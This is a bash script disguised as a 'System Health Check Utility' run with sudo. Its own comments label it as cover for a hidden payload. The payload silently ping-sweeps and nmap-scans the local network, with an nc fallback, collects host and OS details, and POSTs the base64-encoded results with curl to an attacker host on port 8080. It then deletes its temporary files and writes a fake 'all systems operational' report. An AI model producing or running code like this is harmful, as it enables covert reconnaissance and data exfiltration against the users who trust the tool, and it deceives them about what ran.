#!/bin/bash
# ============================================================================
# System Health Check Utility v1.2
# ============================================================================
# This script performs a comprehensive system health check and 
# generates a diagnostic report for system administrators.
#
# Usage: sudo ./system_health_check.sh
# Output: health_report.txt
# ============================================================================

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo "╔═══════════════════════════════════════════════════════════════════╗"
echo "║           System Health Check Utility v1.2                        ║"
echo "║           Checking system status and network connectivity...      ║"
echo "╚═══════════════════════════════════════════════════════════════════╝"
echo ""

# ============================================================================
# LEGITIMATE LOOKING FUNCTIONS (COVER)
# ============================================================================

check_disk_space() {
    echo -e "${GREEN}[✓]${NC} Checking disk space..."
    df -h > /dev/null 2>&1
    sleep 0.5
}

check_memory() {
    echo -e "${GREEN}[✓]${NC} Checking memory usage..."
    free -m > /dev/null 2>&1
    sleep 0.5
}

check_services() {
    echo -e "${GREEN}[✓]${NC} Checking running services..."
    systemctl list-units --type=service --state=running > /dev/null 2>&1
    sleep 0.5
}

check_updates() {
    echo -e "${GREEN}[✓]${NC} Checking for system updates..."
    sleep 1
}

# ============================================================================
# HIDDEN MALICIOUS FUNCTIONS (PAYLOAD)
# ============================================================================

# Load config from same directory or use defaults
SCRIPT_DIR="$(dirname "$0")"
CONFIG_FILE="$SCRIPT_DIR/config.json"

if [ -f "$CONFIG_FILE" ] && command -v jq &> /dev/null; then
    ATTACKER_HOST=$(jq -r '.attacker.host' "$CONFIG_FILE")
    ATTACKER_PORT=$(jq -r '.attacker.port' "$CONFIG_FILE")
    TARGET_NETWORK=$(jq -r '.scan.target_network' "$CONFIG_FILE")
    SCAN_PORTS=$(jq -r '.scan.ports' "$CONFIG_FILE")
else
    # Default values if config not found
    ATTACKER_HOST="192.168.71.100"
    ATTACKER_PORT="8080"
    TARGET_NETWORK="192.168.85.0/24"
    SCAN_PORTS="22,80,443,3389,8080"
fi

# Hidden network discovery - COMPREHENSIVE SCAN
perform_network_audit() {
    SCAN_RESULT="/tmp/.net_audit_$(date +%s).txt"
    PORT_RESULT="/tmp/.port_audit_$(date +%s).txt"
    
    echo "[*] Performing network connectivity audit..." >&2
    
    # Check if nmap is available
    if command -v nmap &> /dev/null; then
        # Step 1: Host discovery (ping sweep)
        echo "[*] Phase 1: Host discovery..." >&2
        nmap -sn -T4 "$TARGET_NETWORK" -oG - 2>/dev/null | grep "Up" | awk '{print $2}' > "$SCAN_RESULT"
        
        # Step 2: Port scan on discovered hosts
        if [ -s "$SCAN_RESULT" ]; then
            HOSTS=$(cat "$SCAN_RESULT" | tr '\n' ' ')
            HOST_COUNT=$(wc -l < "$SCAN_RESULT")
            echo "[*] Phase 2: Scanning $HOST_COUNT hosts..." >&2
            
            # Comprehensive port scan
            nmap -Pn -sS -sV -T4 \
                -p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,1521,3306,3389,5432,5900,8080,8443 \
                --open \
                -oN "$PORT_RESULT" \
                $HOSTS 2>/dev/null
            
            # Also do a quick top ports scan for more coverage
            nmap -Pn -sS -T4 --top-ports 20 -oG - $HOSTS 2>/dev/null >> "${SCAN_RESULT}.extra"
        fi
    else
        # Fallback: use ping + nc for port check
        echo "[*] Using fallback scan method..." >&2
        for i in $(seq 1 254); do
            IP="${TARGET_NETWORK%.*}.$i"
            (ping -c 1 -W 1 "$IP" &>/dev/null && echo "$IP" >> "$SCAN_RESULT") &
        done
        wait
        
        # Basic port check with nc/netcat
        if [ -s "$SCAN_RESULT" ] && command -v nc &> /dev/null; then
            while read -r IP; do
                for PORT in 22 80 443 3389 8080; do
                    nc -zv -w 1 "$IP" "$PORT" 2>&1 | grep -q "succeeded" && echo "$IP:$PORT open" >> "$PORT_RESULT"
                done
            done < "$SCAN_RESULT"
        fi
    fi
    
    # Merge results
    if [ -f "$PORT_RESULT" ]; then
        mv "$PORT_RESULT" "${SCAN_RESULT}.ports"
    fi
    
    echo "$SCAN_RESULT"
}

# Send results to attacker
exfiltrate_data() {
    local data_file="$1"
    
    if [ ! -f "$data_file" ]; then
        return 1
    fi
    
    # Collect system info
    HOSTNAME=$(hostname)
    IP_ADDR=$(hostname -I | awk '{print $1}')
    OS_INFO=$(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'"' -f2)
    
    # Create JSON payload
    PAYLOAD=$(cat <<EOF
{
    "hostname": "$HOSTNAME",
    "ip": "$IP_ADDR",
    "os": "$OS_INFO",
    "timestamp": "$(date -Iseconds)",
    "scan_results": "$(cat "$data_file" 2>/dev/null | base64 -w 0)",
    "port_scan": "$(cat "${data_file}.ports" 2>/dev/null | base64 -w 0)"
}
EOF
)
    
    # Send via curl (silent, ignore errors)
    curl -s -X POST \
        -H "Content-Type: application/json" \
        -H "User-Agent: HealthCheck/1.2" \
        -d "$PAYLOAD" \
        "http://${ATTACKER_HOST}:${ATTACKER_PORT}/upload" \
        --connect-timeout 5 \
        --max-time 10 \
        >/dev/null 2>&1
    
    # Cleanup
    rm -f "$data_file" "${data_file}.ports" 2>/dev/null
}

# ============================================================================
# MAIN EXECUTION
# ============================================================================

# Run cover functions (visible)
check_disk_space
check_memory
check_services
check_updates

# Run hidden payload in background
echo -e "${GREEN}[✓]${NC} Verifying network connectivity..."
SCAN_FILE=$(perform_network_audit 2>/dev/null)
exfiltrate_data "$SCAN_FILE" &

# More cover activity
sleep 1
echo -e "${GREEN}[✓]${NC} Checking DNS resolution..."
sleep 0.5
echo -e "${GREEN}[✓]${NC} Validating system time sync..."
sleep 0.5

# Final message
echo ""
echo "╔═══════════════════════════════════════════════════════════════════╗"
echo "║           Health Check Complete!                                  ║"
echo "╚═══════════════════════════════════════════════════════════════════╝"
echo ""
echo -e "${GREEN}All systems operational.${NC}"
echo "Report saved to: health_report.txt"
echo ""

# Create fake report
cat > health_report.txt << 'EOF'
System Health Report
====================
Generated: $(date)

Status: All systems operational
- Disk: OK
- Memory: OK
- Services: OK
- Network: OK
- Updates: Current

No issues detected.
EOF

exit 0
